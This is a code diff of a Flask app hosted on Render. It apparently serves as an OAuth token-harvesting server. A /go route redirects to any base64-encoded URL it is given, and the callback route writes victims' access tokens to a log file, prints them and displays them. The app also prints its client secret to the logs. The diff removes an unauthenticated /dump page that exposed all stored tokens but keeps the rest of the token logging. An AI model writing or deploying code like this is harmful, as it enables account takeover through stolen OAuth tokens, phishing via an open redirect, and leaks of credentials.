@@ -6,19 +6,18 @@ import os
 
 app = Flask(__name__)
 
-# Load from environment variables
+# Load from Render environment variables
 CLIENT_ID = os.environ.get("CLIENT_ID")
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = os.environ.get("REDIRECT_URI")
 
-# Debug for Render logs
 print("DEBUG: CLIENT_ID =", repr(CLIENT_ID))
 print("DEBUG: CLIENT_SECRET =", repr(CLIENT_SECRET))
 print("DEBUG: REDIRECT_URI =", repr(REDIRECT_URI))
 
 assert CLIENT_ID and CLIENT_SECRET and REDIRECT_URI, "OAuth credentials not set"
 
-# Log to file and Render output
+# Log to file + enable stdout logging for Render
 logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')
 
 @app.route('/')
@@ -33,9 +32,11 @@ def go():
     try:
         decoded = base64.urlsafe_b64decode(encoded.encode()).decode()
         logging.info(f"[REDIRECT] {decoded}")
+        print(f"[REDIRECT] {decoded}")
         return redirect(decoded)
     except Exception as e:
         logging.error(f"[ERROR] Base64 decode failed: {e}")
+        print(f"[ERROR] Base64 decode failed: {e}")
         return f"Invalid base64 input: {e}", 400
 
 @app.route('/callback')
@@ -57,26 +58,18 @@ def callback():
         response.raise_for_status()
         token_data = response.json()
 
-        # Save token to file
+        # Save to file
         with open("tokens.log", "a") as f:
             f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")
 
-        # Print to log (Render logs tab)
-        print(f"[TOKEN RECEIVED]\n{token_data}\n\n")
+        # Print to stdout (Render logs)
+        print(f"[TOKEN RECEIVED]\n{token_data}\n")
 
         return f"<h1>Access Granted</h1><pre>{token_data}</pre>"
 
     except requests.exceptions.RequestException as e:
         print(f"[TOKEN EXCHANGE ERROR] {str(e)}")
         return f"<h1>Token exchange failed:</h1><pre>{str(e)}</pre>", 500
-
-@app.route('/dump')
-def dump():
-    try:
-        with open("tokens.log", "r") as f:
-            return f"<pre>{f.read()}</pre>"
-    except Exception as e:
-        return f"<h1>Error reading log file:</h1><pre>{str(e)}</pre>", 500
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
